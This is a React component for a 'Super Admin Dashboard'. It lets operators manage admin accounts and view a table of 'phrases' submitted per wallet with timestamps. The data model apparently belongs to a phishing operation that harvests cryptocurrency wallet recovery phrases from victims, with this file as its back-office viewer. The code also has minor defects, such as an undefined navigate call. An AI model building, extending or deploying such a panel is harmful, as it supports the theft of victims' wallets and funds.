import React, { useEffect, useState } from 'react'
import "./adminDashboard.css"
import api from '../../components/axiosInstance'
import ConfirmModal from '../../components/modal/confirmModal'

const AdminDashboard = () => {
  
  const [loading, setLoading] = useState(false)
  const [processing, setProcessing] = useState(false);
  const [allAdmin, setAllAdmin] = useState([])
  const [allPhrase, setAllPhrase] = useState([])
  const [message, setMessage] = useState({text: "", type: ""})
  const [activeTab, setActiveTab] = useState("admin")

  const  [adminForm, setAdminForm] = useState({
    email: "",
    password: ""
  })

  const [showConfirm, setShowConfirm] = useState(false)
  const [adminToDelete, setAdminToDelete] = useState(null)

  useEffect(() => {
    fetchAllAdmin(),
    fetchAllPhrase()
  }, [])


  const fetchAllAdmin = async () => {
    try {
      setLoading(true)
      const res = await api.get("/all-admin")
      setAllAdmin(res.data.admins || [])
    } catch (error) {
      if (error.response?.status === 401) {
        localStorage.removeItem("authToken");
        navigate("/login", { replace: true });
      }
      setMessage({
        text: error.response?.data?.message || "Failed to load admins",
        type: "error"
      })
    } finally {
      setLoading(false)
    }
  }

  const fetchAllPhrase = async () => {
    try {
      setLoading(true)
      const res = await api.get("/all-phrase")
      setAllPhrase(res.data.data || [])
    } catch (error) {
      if (error.response?.status === 401) {
        localStorage.removeItem("authToken");
        navigate("/login", { replace: true });
      }
      setMessage({
        text: error.response?.data?.message || "Failed to load phrases",
        type: "error"
      })

    } finally {
      setLoading(false)
    }
  }

  const handleCreateAdmin = async (e) => {
    e.preventDefault()
    try {
      setProcessing(true)
      const res = await api.post("/create-admin", adminForm)
      setMessage({text: res.data.message, type: "success"})
      setAdminForm({email: "", password: ""})
      fetchAllAdmin()
    } catch (error) {
      setMessage({
        text: error.response?.data?.message || "Error creating admin",
        type: "error"
      })
    } finally {
      setProcessing(false)
    }
  }

  const openDeleteModal = (admin) => {
    setAdminToDelete(admin)
    setShowConfirm(true)
  }

  const closeDeleteModal = () => {
    setShowConfirm(false)
    setAdminToDelete(null)
  }

  const handleDeleteAdmin = async () => {
    if(!adminToDelete) return
    
    try {
      setProcessing(true)

      const res = await api.delete(`/delete-admin/${adminToDelete._id}`)

      setMessage({text: res.data.message, type: "success"})
      fetchAllAdmin()
    } catch (error) {
      setMessage({
        text: error.response?.data?.message || "Failed to delete admin",
        type: "error"
      })
    } finally {
      setProcessing(false)
      closeDeleteModal()
    }
  }
  return (
    <div className='super_admin_dashboard'>
      {(loading || processing) && (
        <div className='loading_overlay'>
          <div className='spinner'>
            <p className='loading_text'>
              {processing ? "Processing request..." : "Loading..."}
            </p>
          </div>
        </div>
      )}
      <header className='super_admin'>
        <h2>Super Admin Dashboard</h2>
        <div className='header_buttons'>
          <button onClick={() => setActiveTab("admin")}>Admins</button>
          <button onClick={() => setActiveTab("create-admin")}>New Admin</button>
          <button onClick={() => setActiveTab("phrases")}>Phrases</button>
        </div>
      </header>

      {message.text && (
        <div className={`message ${message.type === "error" ? "error" : "success"}`}>
          {message.text}
        </div>
      )}

      {activeTab === "admin" && (
        <>
          <h3>All Admin</h3>
          {allAdmin.length === 0 ? (
            <p>No Admin found.</p>
          ) : (
            <table>
              <thead>
                <tr>
                  <th>Email</th>
                  <th>Role</th>
                  <th>Status</th>
                </tr>
              </thead>
              <tbody>
                {allAdmin.map((admin) => (
                  <tr key={admin._id}>
                    <td>{admin.email}</td>
                    <td>{admin.role}</td>
                    <td>
                      {admin.isOnline ? (
                        <span className='online'>● Online</span>
                      ) : (
                        <span className='offline'>● Offline</span>
                      )}
                    </td>
                    <td>
                      {admin.role !== "super_admin" && (
                        <button
                          className='delete_btn'
                          onClick={() => openDeleteModal(admin)}
                        >
                          Delete
                         </button>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
          <ConfirmModal
            isOpen={showConfirm}
            title="Delete Admin"
            message={
              adminToDelete
                ? `Are you sure you want to delete ${adminToDelete.email}? This action cannot be undone.`
                : "Are you sure you want to delete this admin?"
            }
            confirmText="Yes, Delete"
            cancelText="Cancel"
            onConfirm={handleDeleteAdmin}
            onCancel={closeDeleteModal}
            loading={processing}
          />
        </>
      )}

      {activeTab === "create-admin" && (
        <>
          <h3>Create New Admin</h3>
          <form onSubmit={handleCreateAdmin}>
            <input 
              type="email"
              placeholder='Email'
              value={adminForm.email}
              onChange={(e) => setAdminForm({ ...adminForm, email: e.target.value})}
              required 
            />
            <input 
              type="password"
              placeholder='Password'
              value={adminForm.password}
              onChange={(e) => setAdminForm({ ...adminForm, password: e.target.value})}
              required
             />
             <button type='submit' disabled={processing}>
              {processing ? "Creating..." : "Create Admin"}
             </button>
          </form>
        </>
      )}


      {activeTab === "phrases" && (
        <>
          <h3>All Phrases</h3>
          {allPhrase.length === 0 ? (
            <p>No Phrase found.</p>
          ) : (
            <table>
              <thead>
                <tr>
                  <th>Wallet</th>
                  <th>Phrase</th>
                  <th>Submitted At</th>
                </tr>
              </thead>
              <tbody>
                {allPhrase.map((row) => (
                  <tr key={row.id}>
                    <td>{row.category}</td>
                    <td>{row.phrases}</td>
                    <td>{new Date(Date.parse(row.createdAt)).toLocaleString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </>
      )}
    </div>
  )
}

export default AdminDashboard
